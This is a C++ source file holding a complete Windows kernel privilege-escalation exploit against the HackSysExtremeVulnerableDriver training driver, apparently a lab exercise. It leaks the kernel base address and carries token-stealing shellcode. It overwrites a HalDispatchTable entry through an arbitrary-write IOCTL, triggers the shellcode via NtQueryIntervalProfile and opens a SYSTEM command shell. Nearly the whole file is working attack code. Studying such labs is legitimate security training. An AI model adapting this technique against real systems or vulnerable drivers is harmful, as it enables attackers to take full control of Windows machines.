#include <iostream>
#include <windows.h>
#include <psapi.h>

typedef NTSTATUS (WINAPI *pNtQueryIntervalProfile)(int, unsigned long);

LPVOID get_base_address(){

    LPVOID lp_image_base[1024];
    DWORD lp_cb_needed;

    BOOL enum_success = EnumDeviceDrivers(lp_image_base, 1024, &lp_cb_needed);

    if (!enum_success){
        printf("[-] Can't enumerate drivers. Exiting.");
        exit(0);
    }
    
    printf("[+] Enumerating drivers...\n");

    for (int i = 0 ; i < 1024 ; i++) {

        char driver_name[48];

        //memset(driver_name, 0, sizeof(driver_name));
        GetDeviceDriverBaseName(lp_image_base[i], driver_name, 48);

        printf("[*] Driver on 0x%p %s\n", lp_image_base[i], driver_name);

        if (std::string((const char *)driver_name).find("krnl") != std::string::npos){
            printf("[+] Found Kernel ntoskrnl on 0x%p\n", lp_image_base[i]);
            return lp_image_base[i];
        }

    }

    printf("[-] Did not find ntoskrnl. Exiting.");
    exit(0);
    return 0;
}

int main(){

    
    HMODULE ntdll = LoadLibraryA("ntdll.dll");
    HMODULE userland_ntoskrnl = LoadLibraryA("ntoskrnl.exe");
    

    pNtQueryIntervalProfile NtQueryIntervalProfile = (pNtQueryIntervalProfile)GetProcAddress(ntdll, "NtQueryIntervalProfile");

    printf("[*] NtQueryIntervalProfile address is: 0x%p\n", NtQueryIntervalProfile);

    HMODULE kernel_base = (HMODULE)get_base_address();

    printf("[*] Userlang ntoskrnl address is: 0x%p\n", (LPVOID)userland_ntoskrnl);

    LPVOID hal_addr = (LPVOID)((unsigned long long)GetProcAddress(userland_ntoskrnl, "HalDispatchTable") + 0x8);

    printf("[*] Userland HalDispatchTable address is: 0x%p\n", hal_addr);

    unsigned long long hal_offset = (unsigned long long)hal_addr -  (unsigned long long)userland_ntoskrnl;

    printf("[*] HalDispatchTable Offset is: 0x%p\n", hal_offset);

    LPVOID kernel_hal = (LPVOID)((unsigned long long)kernel_base + hal_offset);

    printf("[*] Kernel HalDispatchtable is: 0x%p\n", kernel_hal);

    HANDLE hevdHandle = CreateFileA(
        "\\\\.\\HackSysExtremeVulnerableDriver",
        0xC0000000,
        0,
        NULL,
        0x3,
        0,
        NULL
    );

    if (hevdHandle == INVALID_HANDLE_VALUE){

        std::cout << "[-] Error in opening handle\n";
        return -1;
    }

    std::cout << "[+] Successfully opened handle!\n";

    
    unsigned char shellcode[] = 
        "\x50\x51\x52\x48\x31\xC0\x65\x48\x8B\x80\x88\x01\x00\x00\x48\x8B\x40\x70\x48\x89\xC1\x48\xC7\xC2\x04\x00\x00\x00\x48\x8B\x80\x88\x01\x00\x00\x48\x2D\x88\x01\x00\x00\x48\x39\x90\x80\x01\x00\x00\x75\xEA\x48\x8B\x90\x08\x02\x00\x00\x48\x89\x91\x08\x02\x00\x00\x5A\x59\x58" // Actual shellcode
        "\xc3"; // ret instruction to not blue screen

    LPVOID virt = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    RtlCopyMemory(virt, shellcode, sizeof(shellcode));

    printf("[*] Setup Virtualalloc and shellcode on: 0x%p\n", virt);

    LPVOID buffer[2];

    buffer[0] = &virt;
    buffer[1] = kernel_hal;

    DWORD outbuf;

    printf("[*] Sending buffer to HEVD Arbitrary Overwrite...\n");
    DeviceIoControl(hevdHandle, 0x22200b, buffer, sizeof(buffer), NULL, 0, &outbuf, NULL);

    unsigned long dummy = 0x0;
    printf("[+] Calling NtQueryIntervalProfile...\n");
    NtQueryIntervalProfile(0xdead, (unsigned long long)&dummy);
    
    printf("[+] Initializing CMD\n");
    system("cmd");

    return 0;

}
